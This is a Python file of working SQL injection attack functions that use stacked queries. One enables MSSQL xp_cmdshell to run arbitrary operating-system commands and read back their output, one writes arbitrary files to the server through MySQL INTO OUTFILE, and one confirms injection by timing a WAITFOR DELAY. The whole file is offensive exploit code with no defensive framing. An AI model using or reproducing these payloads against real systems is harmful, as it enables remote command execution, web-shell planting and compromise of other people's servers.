import urllib.request
import urllib.parse
import time

def stacked_xp_cmdshell(url, param, command):
    """Execute OS command via MSSQL xp_cmdshell using stacked queries.
    Enables xp_cmdshell if disabled, runs the command, stores output in temp table."""
    stmts = [
        "EXEC sp_configure 'show advanced options',1;RECONFIGURE",
        "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE",
        "CREATE TABLE #cmd_out(line NVARCHAR(4000))",
        "INSERT INTO #cmd_out EXEC xp_cmdshell '%s'" % command.replace("'", "''"),
    ]
    for stmt in stmts:
        payload = "'; %s-- -" % stmt
        full_url = url + urllib.parse.quote(payload, safe='')
        try:
            urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        except Exception:
            pass
    read_payload = "' UNION SELECT line FROM #cmd_out-- -"
    full_url = url + urllib.parse.quote(read_payload, safe='')
    try:
        resp = urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        return resp.read().decode('utf-8', errors='replace')
    except Exception:
        return None

def stacked_into_outfile(url, param, content, remote_path):
    """Write a file to disk via MySQL INTO OUTFILE using stacked queries."""
    hex_content = content.encode().hex()
    payload = "'; SELECT 0x%s INTO OUTFILE '%s'-- -" % (hex_content, remote_path)
    full_url = url + urllib.parse.quote(payload, safe='')
    try:
        urllib.request.urlopen(urllib.request.Request(full_url), timeout=15)
        return True
    except Exception:
        return False

def stacked_delay_confirm(url, param, delay=5):
    """Confirm stacked query support via time delay."""
    payload = "'; WAITFOR DELAY '0:0:%d'-- -" % delay
    full_url = url + urllib.parse.quote(payload, safe='')
    start = time.monotonic()
    try:
        urllib.request.urlopen(urllib.request.Request(full_url), timeout=delay + 10)
    except Exception:
        pass
    return (time.monotonic() - start) >= delay * 0.8

